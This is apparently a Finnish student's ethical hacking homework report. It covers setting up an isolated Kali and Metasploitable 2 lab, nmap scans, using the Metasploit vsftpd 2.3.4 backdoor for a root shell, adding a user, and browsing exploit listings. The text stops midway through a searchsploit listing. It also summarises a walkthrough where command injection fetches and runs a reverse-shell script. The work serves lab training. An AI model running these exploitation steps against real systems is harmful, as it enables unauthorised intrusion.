Testaukset tehty Windows 10 käyttöjärjestelmällä, Version 10.0.19045 Build 19045. Tämän lisäksi käytetty myös Kali Linux versio 2023.3 ajettuna VirtualBoxin versio 6.1 kautta,  Prosessorina Intel(R) Core(TM) i7-8700K CPU @ 3.70GHz, 16GB RAM

[https://terokarvinen.com/2023/eettinen-hakkerointi-2023/#h3-lab-kid](https://terokarvinen.com/2023/eettinen-hakkerointi-2023/#h3-lab-kid)

#### x\) Lue/katso ja tiivistä.

##### € Velu 2022: Mastering Kali Linux for Advanced Penetration Testing 4ed: Chapter 10 - Exploitation: kappaleet "The Metasploit Framework", "The exploitation of targets using Metasploit" ja "Using public exploits". Eli ei enää kappaletta "Developing a Windows exploit" ja siitä eteenpäin.

  - Metasploit Framework (MSF) on avoimeen lähdekoodiin perustuva työkalu joka on suunniteltu toimimaan penetraatiotestauksessa.
  - Modulaarinen lähestymistapa erilaisten hyökkäysten toimittamiseen
    - Sisältää:
      - Kirjastoja (esim. REX, joka käsittelee mm. socket-yhteyksiä)
      - Käyttöliittymiä (esim. `msfconsole`, tähän tutustutaan myöhemmin)
      - Moduuleita (esim. hyökkäykset, hyötykuormat, encoderit)
  - Toiminta pähkinänkuoressa: käynnistä -> luo työtila hyökkäämistä varten -> skannaa kohde -> valitse haavoittuvuus -> valitse ja aja hyökkäys
  - Sisältää esimerkkiohjeet yksinkertaiseen reverse shelliin Meterpreterillä
    - Sessioiden pyörittäminen taka-alalla: `"Run Meterpreter in the background by pressing Ctrl + Z. You should receive Background session 1? [y/N] y enter y."`
  - Sisältää ohjeet useamman kohteen exploittaamiseen kerralla
  - Julkisten exploittien käyttö esim. Exploit-DB (tietokanta julkisista haavoittuvuuksista), SearchSploit (Kali Linuxissa löytyvä hakukone Exploit-DB:tä varten)


##### Vapaavalintainen läpikävely 0xdf tai ippsec (Kannattaa valita helppo; esim "Base Points: Easy")

[https://0xdf.gitlab.io/2023/02/11/htb-photobomb.html](https://0xdf.gitlab.io/2023/02/11/htb-photobomb.html)

  - [HackTheBoxin](https://www.hackthebox.com/) viikottaisissa haastekoneissa helppojen alla
  - Recon nmapilla, portit 22 ja 80 auki - 80 redirectaa sivustolle photobomb.htp
  - Fuzzaus ffuffilla ei johda mihinkään
  - Sivustolla on HTTP kirjautumislomake
  - Sivuston JavaScript-tiedosto sisältää käyttäjätunnuksen ja salasanan
  - Kirjautuneena voi pyytää sivustolta latauslinkkiä kuviin, ja hyökkääjä kokeilee näihin komentoinjektioita
  - Injektiolla hyökkääjä curlaa oman weppiserverinsä ja ajaa sieltä reverse shellin käynnistävän bash-skriptin
  - Hyökkääjäkoneella kuunnellaan netcatilla, saadaan yhteys, tehdään [shellin päivitys (YouTube-linkki)](https://www.youtube.com/watch?v=DqE6DxqJg8Q)
  - Uhrilla oleva skripti sisältää avonaisen `enable -n [ `-kohdan, jonka loppuosa on kommentoitu pois. Tätä vivuttamalla hyökkääjä saa koneeseen rootit
  
  ##### Nyrkkeilysäkki ei kuulu. Etsi hakukoneesta kotitehtäväraportti, jossa Kali ja Metasploitable on asennettu samaan verkkooon VirtualBoxiin; sekä testaamalla osoitettu, että koneet on saatu irti Internetistä.

  - [https://github.com/therealhalonen/penetration_testing/blob/master/h1/report.md](https://github.com/therealhalonen/penetration_testing/blob/master/h1/report.md) Antti Halosen viime kevään toteutuksella tehty vastaava raportti. Käytän näitä ohjeita läksyjä tehdessäni.

#### a\) Asenna Kali virtuaalikoneeseen

Olin jo asentanut Kalin aiemmin, mutta tehdään virtuaaliverkkoa varten oma asennus.

  1. Lataa itsellesi sopiva versio [Kalista](https://www.kali.org/get-kali/). Itse valitsin [64-bit Installer imagen](https://cdimage.kali.org/kali-2023.3/kali-linux-2023.3-installer-amd64.iso), jotta voin klikkailla menemään kaikki asennuksen vaiheet itse.
  2. Valmistele kone Virtualboxissa: New (ctrl + N) -> asetin nimeksi "susi" ja laitoin välimuistin määräksi 8192MB. Valitsin myös vaihtoehdon kovalevyn luomiseksi asennuksen yhteydessä. -> Create -> Annoin asennuspolun mennä oletusarvoisella arvolla, mutta kovalevyn kooksi laitoin 20GB, kovalevyn tyypiksi VDI ja tallennustilan dynaamiseksi.

![1](img/1.png)

  3. Määrittelin Settingsistä vielä Antti Halosen ohjeita hyödyntäen verkkoa varten valmiiksi kaksi eri verkkoliitintä:
    * Adapter 1: Bridged Adapter (Yhteys ulkoverkkoon kohtaa c\) varten)
    * Adapter 2: Host-Only Adapter #3. Tämän adapterin tein Virtualboxin kohdasta File -> Host Network Manager. Säädin sen palvelimeksi 192.168.66.1 ja osoiteavaruudeksi 192.168.66.2-254

![4](img/4.png)

  4. Käynnistin virtuaalikoneen ja valitsin kalin .iso-tiedoston asennusmediaksi. Seuraavissa asennusvaiheissa Install (ei graphical) -> kieleksi englanti, sijainniksi ja näppäimistön kieleksi suomi -> hostiksi 'isopaha' ja käyttäjäksi 'susi' (sekä turvallinen salasana), muihin valintoihin oletusasetukset. Asennuksessa kesti muutamia minuutteja.

#### b\) Asenna Metasploitable 2 virtuaalikoneeseen

Samaan tyyliin kuin Kalia asentaessa, ladataan [asennustiedosto (https://sourceforge.net/projects/metasploitable/)](https://sourceforge.net/projects/metasploitable/). Tiedosto unzipataan ja luodaan VirtualBoxissa uusi kone. Eri tavoin kuin Kalia asentaessa, Metasploitablessa käytetään valmista virtuaalikoneen levykuvaa:

![2](img/2.png)

TÄRKEÄÄ! Asetin koneen Network-asetuksista yhteyksiin Host-Only -yhteyden, jotta tämä erittäin haavoittuvainen tietokone ei näkyisi ulkoverkkoon suoraan.

#### c\) Tee koneille virtuaaliverkko, jossa

  *  Kali saa yhteyden Internettiin, mutta sen voi laittaa pois päältä
  *  Kalin ja Metasploitablen välillä on host-only network, niin että porttiskannatessa ym. koneet on eristetty intenetistä, mutta ne saavat yhteyden toisiinsa
  *  Osoita eri komennoilla, että Internet-yhteys katkeaa: 'ping 1.1.1.1', 'ping www.google.com', 'curl www.google.com'

Tämä kohta tehtiin edellisissä kohdissa todistamista vaille valmiiksi.

Kalin internetasetukset vaikuttivat hyviltä, ja toisessa verkkoadapterissa tuli ennaltamääritelty säädetty osoiteavaruuden osoite:

![5](img/5.png)

eth0 on yhteys ulkoverkkoon ja eth1 on sisäverkko jolla ei pääse ulkoverkkoihin. Tarkistus vielä eth0 "johto kiinni":

```

┌──(susi㉿isopaha)-[~]
└─$ ip route get 8.8.8.8
8.8.8.8 via 192.168.1.1 dev eth0 src 192.168.1.104 uid 1000 
    cache 
                                                                                       
┌──(susi㉿isopaha)-[~]
└─$ ip route get 4.4.4.4
4.4.4.4 via 192.168.1.1 dev eth0 src 192.168.1.104 uid 1000 
    cache 
                                                                                       
┌──(susi㉿isopaha)-[~]
└─$ ping google.fi
PING google.fi(hem08s06-in-x03.1e100.net (2a00:1450:4026:804::2003)) 56 data bytes
64 bytes from hem08s06-in-x03.1e100.net (2a00:1450:4026:804::2003): icmp_seq=1 ttl=59 time=11.6 ms
64 bytes from hem08s06-in-x03.1e100.net (2a00:1450:4026:804::2003): icmp_seq=2 ttl=59 time=9.75 ms
64 bytes from hem08s06-in-x03.1e100.net (2a00:1450:4026:804::2003): icmp_seq=3 ttl=59 time=13.7 ms
64 bytes from hem08s06-in-x03.1e100.net (2a00:1450:4026:804::2003): icmp_seq=4 ttl=59 time=9.70 ms
64 bytes from hem08s06-in-x03.1e100.net (2a00:1450:4026:804::2003): icmp_seq=5 ttl=59 time=11.3 ms
^C
--- google.fi ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4005ms
rtt min/avg/max/mdev = 9.699/11.205/13.742/1.480 ms
                                                
```

"Johdon irrotus" toimii klikkaamalla hiiren oikealla korvalla VirtualBoxin alalaidassa olevasta kuvakkeesta ja valitsemalla katkaistava yhteys (tapauksessani Network Adapter 1)

![6](img/6.png)

```

┌──(susi㉿isopaha)-[~]
└─$ ip route get 8.8.8.8
RTNETLINK answers: Network is unreachable
                                                                                       
┌──(susi㉿isopaha)-[~]
└─$ ip route get 4.4.4.4
RTNETLINK answers: Network is unreachable
                                                                                       
┌──(susi㉿isopaha)-[~]
└─$ ping google.fi      
ping: google.fi: Temporary failure in name resolution


```

Tämän testaamisen jälkeen (useamman kerran, myös selaimella) käynnistin metasploitablen.

![](img/7.png)

#### d\) Etsi Metasploitable porttiskannaamalla (db_nmap -sn). Tarkista selaimella, että löysit oikean IP:n - Metasploitablen weppipalvelimen etusivulla lukee Metasploitable. Katso, ettei skannauspaketteja vuoda Internetiin - kannattaa irrottaa koneet netistä skannatessa.

Loin työtilalle hakemiston, siirryin sinne ja käynnistin Metasploitin. Tein työtilan

```

┌──(susi㉿isopaha)-[~]
└─$ mkdir ensipuraisu
                                                                                       
┌──(susi㉿isopaha)-[~]
└─$ cd ensipuraisu 
                                                                                       
┌──(susi㉿isopaha)-[~/ensipuraisu]
└─$ sudo msfdb run     
[sudo] password for susi: 
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
                                                  
# [HIENOA ASCII-TAIDETTA, JOKA EI OLE OLEELLISTA]


       =[ metasploit v6.3.27-dev                          ]
+ -- --=[ 2335 exploits - 1220 auxiliary - 413 post       ]
+ -- --=[ 1382 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View a module's description using 
info, or the enhanced version in your browser with 
info -d
Metasploit Documentation: https://docs.metasploit.com/

msf6 > workspace -a ensipuraisu
[*] Added workspace: ensipuraisu
[*] Workspace: ensipuraisu

```

Sitten porttiskannasin ping sweepillä:

```

msf6 > db_nmap -sn 192.168.66.*
[*] Nmap: Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-12 00:16 EET
[*] Nmap: 'mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers'
[*] Nmap: Nmap scan report for 192.168.66.1
[*] Nmap: Host is up (0.00058s latency).
[*] Nmap: MAC Address: 08:00:27:F8:4C:DA (Oracle VirtualBox virtual NIC)
[*] Nmap: Nmap scan report for 192.168.66.3
[*] Nmap: Host is up (0.00056s latency).
[*] Nmap: MAC Address: 08:00:27:22:E0:1B (Oracle VirtualBox virtual NIC)
[*] Nmap: Nmap scan report for 192.168.66.2
[*] Nmap: Host is up.
[*] Nmap: Nmap done: 256 IP addresses (3 hosts up) scanned in 2.05 seconds

```

Kolme kohdetta löytyi, joista ensimmäinen on virtuaalipalvelin. 199.168.66.2 on hyökkääjäkone (selviää esim. komennolla `hostname -I`). Kolmas on siis luultavasti metasploitable.

#### e\) Porttiskannaa Metasploitable huolellisesti (db_nmap -A -p0-). Analysoi tulos. Kerro myös ammatillinen mielipiteesi (uusi, vanha, tavallinen, erikoinen), jos jokin herättää ajatuksia.

Kokeilin ensin annettua komentoa. Tulosten saamisessa kesti niin pitkään, että keskeytin skannaamisen ctrl+c:llä. Lisäsin skannaukseen lipun -v jotta saisin enemmän verbositeettia irti skannauksen ajaksi.

```

msf6 > db_nmap -A -v -p0- 192.168.66.3 
[*] Nmap: Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-12 00:22 EET
[*] Nmap: NSE: Loaded 156 scripts for scanning.
[*] Nmap: NSE: Script Pre-scanning.
[*] Nmap: Initiating NSE at 00:22
[*] Nmap: Completed NSE at 00:22, 0.00s elapsed
[*] Nmap: Initiating NSE at 00:22
[*] Nmap: Completed NSE at 00:22, 0.00s elapsed
[*] Nmap: Initiating NSE at 00:22
[*] Nmap: Completed NSE at 00:22, 0.00s elapsed
[*] Nmap: Initiating ARP Ping Scan at 00:22
[*] Nmap: Scanning 192.168.66.3 [1 port]
[*] Nmap: Completed ARP Ping Scan at 00:22, 0.03s elapsed (1 total hosts)
[*] Nmap: 'mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers'
[*] Nmap: Initiating SYN Stealth Scan at 00:22
[*] Nmap: Scanning 192.168.66.3 [65536 ports]
[*] Nmap: Discovered open port 5900/tcp on 192.168.66.3
[*] Nmap: Discovered open port 53/tcp on 192.168.66.3
[*] Nmap: Discovered open port 3306/tcp on 192.168.66.3
[*] Nmap: Discovered open port 111/tcp on 192.168.66.3
[*] Nmap: Discovered open port 80/tcp on 192.168.66.3

...

```

Jne. Nyt ainakin tiedän skannauksen toimivan ja sieltä löytyi jo alustavasti avoimia portteja. Keittelin tässä vaiheessa kahvit, sillä skannauksessa tuntui kestävän...
Skannauksen tuloksena löytyi vaikka mitä mielenkiintoista. Poimitaan esimerkiksi vaikkapa:

```

[*] Nmap: PORT      STATE SERVICE     VERSION
[*] Nmap: 21/tcp    open  ftp         vsftpd 2.3.4
[*] Nmap: | ftp-syst:
[*] Nmap: |   STAT:
[*] Nmap: | FTP server status:
[*] Nmap: |      Connected to 192.168.66.2
[*] Nmap: |      Logged in as ftp
[*] Nmap: |      TYPE: ASCII
[*] Nmap: |      No session bandwidth limit
[*] Nmap: |      Session timeout in seconds is 300
[*] Nmap: |      Control connection is plain text
[*] Nmap: |      Data connections will be plain text
[*] Nmap: |      vsFTPd 2.3.4 - secure, fast, stable
[*] Nmap: |_End of status
[*] Nmap: |_ftp-anon: Anonymous FTP login allowed (FTP code 230)

```

ftp-palvelimelle voi kirjautua anonyymisti? Mielenkiintoista. Myös nopealla googlauksella vsftpd:n uusin versio on 3.0.5, eli vanhassa versiossa voi löytyä haavoittuvuuksia.
Myös esim. HTTP-palvelin vaikuttaa erittäin vanhalta versiolta. Myös metodi OPTIONS [vaikuttaa mielenkiintoiselta](https://www.rapid7.com/db/vulnerabilities/http-options-method-enabled/) jättää auki pyyntöihin: "Web servers that respond to the OPTIONS HTTP method expose what other methods are supported by the web server, allowing attackers to narrow and intensify their efforts."

```

[*] Nmap: 80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
[*] Nmap: |_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
[*] Nmap: |_http-title: Metasploitable2 - Linux
[*] Nmap: | http-methods:
[*] Nmap: |_  Supported Methods: GET HEAD POST OPTIONS

```

#### f\) Murtaudu Metasploitablen VsFtpd-palveluun Metasploitilla (search vsftpd, use 0, set RHOSTS - varmista osoite huolella, exploit, id)

Etsin tietoa VsFtpd:n versiosta:

```

msf6 > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution                                                       


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor                                                

```

Backdoor kuulostaa oikein kivalta! Katsoin sen tiedot `info 0`:lla, description: 

"Description:
  This module exploits a malicious backdoor that was added to the       VSFTPD download
  archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between
  June 30th 2011 and July 1st 2011 according to the most recent information
  available. This backdoor was removed on July 3rd 2011.
"

Syötin komennon `use 0`, 

```

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/interact

```

Conffasin `options`-komennolla ja asetin RHOSTS-kohtaan kohdekoneen ip-osoitteen

```

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:h
                                       ost:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploi
                                       t.com/docs/using-metasploit/basics/using-metas
                                       ploit.html
   RPORT    21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > setg RHOSTS 192.168.66.3
RHOSTS => 192.168.66.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 

```

Käynnistin exploitin ja sain yhteyden!

```

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.66.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.66.3:21 - USER: 331 Please specify the password.
[+] 192.168.66.3:21 - Backdoor service has been spawned, handling...
[+] 192.168.66.3:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.66.2:43121 -> 192.168.66.3:6200) at 2023-11-12 00:41:32 +0200
whoami
root
id
uid=0(root) gid=0(root)

```

#### g\) Parempi sessio. Tee vsftpd-hyökkäyksestä saadusta sessiosta parempi. (Voit esimerkiksi päivittää sen meterpreter-sessioksi, laittaa tty:n toimimaan tai tehdä uuden käyttäjän ja ottaa yhteyden jollain tavallisella protokollalla)

Lisäsin käyttäjän `mummo`

```

adduser mummo
Adding user `mummo' ...
Adding new group `mummo' (1003) ...
Adding new user `mummo' (1003) with group `mummo' ...
Creating home directory `/home/mummo' ...
Copying files from `/etc/skel' ...
Enter new UNIX password: Rumm0_!    
Retype new UNIX password: Rumm0_!
passwd: password updated successfully
Changing the user information for mummo
Enter the new value, or press ENTER for the default
        Full Name []: Mummo
        Room Number []: 
        Work Phone []: 
        Home Phone []: 111
        Other []: 

id mummo
uid=1003(mummo) gid=1003(mummo) groups=1003(mummo)

```

Ja otin telnet-yhteyden erillisestä konsolista:

```

┌──(susi㉿isopaha)-[~]
└─$ telnet 192.168.66.3
Trying 192.168.66.3...
Connected to 192.168.66.3.
Escape character is '^]'.
                _                  _       _ _        _     _      ____  
 _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                            |_|                                          


Warning: Never expose this VM to an untrusted network!

Contact: msfdev[at]metasploit.com

Login with msfadmin/msfadmin to get started


metasploitable login: mummo
Password: 
Last login: Sat Nov 11 18:55:41 EST 2023 on pts/1
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
mummo@metasploitable:~$ whoami
mummo

```

#### h\) Etsi, tutki ja kuvaile jokin hyökkäys ExploitDB:sta. (Tässä harjoitustehtävässä pitää hakea ja kuvailla hyökkäys, itse hyökkääminen jää vapaaehtoiseksi lisätehtäväksi)

Katsoin läpi Metasploitablen haavoittuvuudet Metasploitissa komennolla `services`

```

msf6 > services
Services
========

host          port   proto  name         state  info
----          ----   -----  ----         -----  ----
192.168.66.3  21     tcp    ftp          open   vsftpd 2.3.4
192.168.66.3  22     tcp    ssh          open   OpenSSH 4.7p1 Debian 8ubuntu1 protoco
                                                l 2.0
192.168.66.3  23     tcp    telnet       open   Linux telnetd
192.168.66.3  25     tcp    smtp         open   Postfix smtpd
192.168.66.3  80     tcp    http         open   Apache httpd 2.2.8 (Ubuntu) DAV/2
192.168.66.3  111    tcp    rpcbind      open   2 RPC #100000
192.168.66.3  139    tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: WORKG
                                                ROUP
192.168.66.3  445    tcp    0��ta��u     open   Samba smbd 3.0.20-Debian workgroup: W
                                                ORKGROUP
192.168.66.3  512    tcp    exec         open   netkit-rsh rexecd
192.168.66.3  513    tcp    login        open   OpenBSD or Solaris rlogind
192.168.66.3  514    tcp    shell        open   Netkit rshd
192.168.66.3  1099   tcp    java-rmi     open   GNU Classpath grmiregistry
192.168.66.3  1524   tcp    bindshell    open   Metasploitable root shell
192.168.66.3  2049   tcp    nfs          open   2-4 RPC #100003
192.168.66.3  2121   tcp    ftp          open   ProFTPD 1.3.1
192.168.66.3  3306   tcp    mysql        open   MySQL 5.0.51a-3ubuntu5
192.168.66.3  3632   tcp    distccd      open   distccd v1 (GNU) 4.2.4 (Ubuntu 4.2.4-
                                                1ubuntu4)
192.168.66.3  5432   tcp    postgresql   open   PostgreSQL DB 8.3.0 - 8.3.7
192.168.66.3  5900   tcp    vnc          open   VNC protocol 3.3
192.168.66.3  6000   tcp    x11          open   access denied
192.168.66.3  6667   tcp    irc          open   UnrealIRCd
192.168.66.3  6697   tcp    irc          open   UnrealIRCd
192.168.66.3  8009   tcp    ajp13        open   Apache Jserv Protocol v1.3
192.168.66.3  8180   tcp    http         open   Apache Tomcat/Coyote JSP engine 1.1
192.168.66.3  8787   tcp    drb          open   Ruby DRb RMI Ruby 1.8; path /usr/lib/
                                                ruby/1.8/drb
192.168.66.3  33428  tcp    java-rmi     open   GNU Classpath grmiregistry
192.168.66.3  47382  tcp    mountd       open   1-3 RPC #100005
192.168.66.3  51234  tcp    status       open   1 RPC #100024
192.168.66.3  56310  tcp    nlockmgr     open   1-4 RPC #100021

```

Searchsploit hyödyntää ExploitDB-tietokantaa, joten käytin sitä tutkiakseni muita vaihtoehtoja liittyen telnet-yhteyksiin, joita käytettiin edellisessä kohdassa tehtäviä:

```

msf6 > search telnet

Matching Modules
================

   #   Name                                                               Disclosure Date  Rank       Check  Description
   -   ----                                                               ---------------  ----       -----  -----------
   0   exploit/linux/misc/asus_infosvr_auth_bypass_exec                   2015-01-04       excellent  No     ASUS infosvr Auth Bypass Command Execution
   1   exploit/linux/http/asuswrt_lan_rce                                 2018-01-22       excellent  No     AsusWRT LAN Unauthenticated Remote Code Execution
   2   auxiliary/server/capture/telnet                                                     normal     No     Authentication Capture: Telnet
   3   auxiliary/scanner/telnet/brocade_enable_login                                       normal     No     Brocade Enable Login Check Scanner
   4   exploit/windows/proxy/ccproxy_telnet_ping                          2004-11-11       average    Yes    CCProxy Telnet Proxy Ping Overflow
   5   auxiliary/dos/cisco/ios_telnet_rocem                               2017-03-17       normal     No     Cisco IOS Telnet Denial of Service
   6   auxiliary/admin/http/dlink_dir_300_600_exec_noauth                 2013-02-04       normal     No     D-Link DIR-600 / DIR-300 Unauthenticated Remote Command Execution
   7   exploit/linux/http/dlink_diagnostic_exec_noauth                    2013-03-05       excellent  No     D-Link DIR-645 / DIR-815 diagnostic.php Command Execution
   8   exploit/linux/http/dlink_dir300_exec_telnet                        2013-04-22       excellent  No     D-Link Devices Unauthenticated Remote Command Execution
   9   exploit/unix/webapp/dogfood_spell_exec                             2009-03-03       excellent  Yes    Dogfood CRM spell.php Remote Command Execution
   10  exploit/freebsd/telnet/telnet_encrypt_keyid                        2011-12-23       great      No     FreeBSD Telnet Service Encryption Key ID Buffer Overflow
   11  exploit/windows/telnet/gamsoft_telsrv_username                     2000-07-17       average    Yes    GAMSoft TelSrv 1.5 Username Buffer Overflow
   12  exploit/windows/telnet/goodtech_telnet                             2005-03-15       average    No     GoodTech Telnet Server Buffer Overflow
   13  exploit/linux/misc/hp_jetdirect_path_traversal                     2017-04-05       normal     No     HP Jetdirect Path Traversal Arbitrary Code Execution
   14  exploit/linux/http/huawei_hg532n_cmdinject                         2017-04-15       excellent  Yes    Huawei HG532n Command Injection
   15  exploit/linux/misc/igel_command_injection                          2021-02-25       excellent  Yes    IGEL OS Secure VNC/Terminal Command Injection RCE
   16  auxiliary/scanner/ssh/juniper_backdoor                             2015-12-20       normal     No     Juniper SSH Backdoor Scanner
   17  auxiliary/scanner/telnet/lantronix_telnet_password                                  normal     No     Lantronix Telnet Password Recovery
   18  auxiliary/scanner/telnet/lantronix_telnet_version                                   normal     No     Lantronix Telnet Service Banner Detection
   19  exploit/linux/telnet/telnet_encrypt_keyid                          2011-12-23       great      No     Linux BSD-derived Telnet Service Encryption Key ID Buffer Overflow                                                                                                                                                                                               
   20  auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof                       2010-12-21       normal     No     Microsoft IIS FTP Server Encoded Response Overflow Trigger
   21  exploit/linux/telnet/netgear_telnetenable                          2009-10-30       excellent  Yes    NETGEAR TelnetEnable
   22  auxiliary/admin/http/netgear_pnpx_getsharefolderlist_auth_bypass   2021-09-06       normal     Yes    Netgear PNPX_GetShareFolderList Authentication Bypass
   23  auxiliary/admin/http/netgear_r6700_pass_reset                      2020-06-15       normal     Yes    Netgear R6700v3 Unauthenticated LAN Admin Password Reset
   24  auxiliary/admin/http/netgear_r7000_backup_cgi_heap_overflow_rce    2021-04-21       normal     Yes    Netgear R7000 backup.cgi Heap Overflow RCE
   25  exploit/unix/misc/polycom_hdx_auth_bypass                          2013-01-18       normal     Yes    Polycom Command Shell Authorization Bypass
   26  exploit/unix/misc/polycom_hdx_traceroute_exec                      2017-11-12       excellent  Yes    Polycom Shell HDX Series Traceroute Command Execution
   27  exploit/freebsd/ftp/proftp_telnet_iac                              2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
   28  exploit/linux/ftp/proftp_telnet_iac                                2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   29  auxiliary/scanner/telnet/telnet_ruggedcom                                           normal     No     RuggedCom Telnet Password Generator
   30  auxiliary/scanner/telnet/satel_cmd_exec                            2017-04-07       normal     No     Satel Iberia SenNet Data Logger and Electricity Meters Command Injection Vulnerability
   31  exploit/solaris/telnet/ttyprompt                                   2002-01-18       excellent  No     Solaris in.telnetd TTYPROMPT Buffer Overflow
   32  exploit/solaris/telnet/fuser                                       2007-02-12       excellent  No     Sun Solaris Telnet Remote Authentication Bypass Vulnerability
   33  exploit/linux/http/tp_link_sc2020n_authenticated_telnet_injection  2015-12-20       excellent  No     TP-Link SC2020n Authenticated Telnet Injection
   34  auxiliary/scanner/telnet/telnet_login                                               normal     No     Telnet Login Check Scanner
   35  auxiliary/scanner/telnet/telnet_version                                             normal     No     Telnet Service Banner Detection
   36  auxiliary/scanner/telnet/telnet_encrypt_overflow                                    normal     No     Telnet Service Encryption Key ID Overflow Detection
   37  payload/cmd/unix/bind_busybox_telnetd                                               normal     No     Unix Command Shell, Bind TCP (via BusyBox telnetd)
   38  payload/cmd/unix/reverse                                                            normal     No     Unix Command Shell, Double Reverse TCP (telnet)
   39  payload/cmd/unix/reverse_ssl_double_telnet                                          normal     No     Unix Command Shell, Double Reverse TCP SSL (telnet)
   40  payload/cmd/unix/reverse_bash_telnet_ssl                                            normal     No     Unix Command Shell, Reverse TCP SSL (telnet)
   41  exploit/linux/ssh/vyos_restricted_shell_privesc                    2018-11-05       great      Yes    VyOS restricted-shell Escape and Privilege Escalation
   42  post/windows/gather/credentials/mremote                                             normal     No     Windows Gather mRemote Saved Password Extraction


Interact with a module by name or index. For example info 42, use 42 or use post/windows/gather/credentials/mremote

msf6 > 

```

Tavaraa olikin reippaamminlaisesti! Katsotaan satunnaisesti valittuna vielä infot 0-kohdan exploitista:

```

msf6 > info 0

       Name: ASUS infosvr Auth Bypass Command Execution
     Module: exploit/linux/misc/asus_infosvr_auth_bypass_exec
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2015-01-04

Provided by:
  Friedrich Postelstorfer
  jduck <jduck@metasploit.com>
  bcoles <bcoles@gmail.com>

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic

Check supported:
  No

Basic options:
  Name                 Current Setting  Required  Description
  ----                 ---------------  --------  -----------
  RHOSTS                                yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi
                                                  cs/using-metasploit.html
  RPORT                9999             yes       The target port (UDP)
  TelnetBannerTimeout  25               yes       The number of seconds to wait for the telnet banner
  TelnetPort           4444             yes       The port for Telnetd to bind
  TelnetTimeout        10               yes       The number of seconds to wait for connection to telnet

Payload information:

Description:
  This module exploits an authentication bypass vulnerability in the
  infosvr service running on UDP port 9999 on various ASUS routers to
  execute arbitrary commands as root.

  This module launches the BusyBox Telnet daemon on the port specified
  in the TelnetPort option to gain an interactive remote shell.

  This module was tested successfully on an ASUS RT-N12E with firmware
  version 2.0.0.35.

  Numerous ASUS models are reportedly affected, but untested.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2014-9583
  https://www.exploit-db.com/exploits/35688
  https://github.com/jduck/asus-cmd


View the full module info with the info -d command.

```

Eli ilmeisesti exploit hyödyntää autentikaation ohittamista haavoittuvissa reitittimissä. Se avaa BusyBoxilla Telnet-daemonin annettuun porttiin jolla saa etä-shellin jota voi käyttää komentojen antamiseen. Ajanpuutteen vuoksi en testaa tätä Metasploitableen nyt.

#### i\) Etsi, tutki ja kuvaile hyökkäys 'searchsploit' -komennolla. Muista päivittää. (Tässä harjoitustehtävässä pitää hakea ja kuvailla hyökkäys, itse hyökkääminen jää vapaaehtoiseksi lisätehtäväksi. Valitse eri hyökkäys kuin edellisessä kohdassa.)

Huom! En muistaaksen muistanut päivittää. Lähdin silti tutkimaan MySQL-tietokantoihin löytyviä haavoittuvuuksia (metasploitable 2:ssa on tarjolla `192.168.66.3  3306   tcp    mysql        open   MySQL 5.0.51a-3ubuntu5` versio MySQL:stä)

```

┌──(susi㉿isopaha)-[~]
└─$ searchsploit mysql    
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
Active Calendar 1.2 - '/data/mysqlevents.p | php/webapps/29653.txt
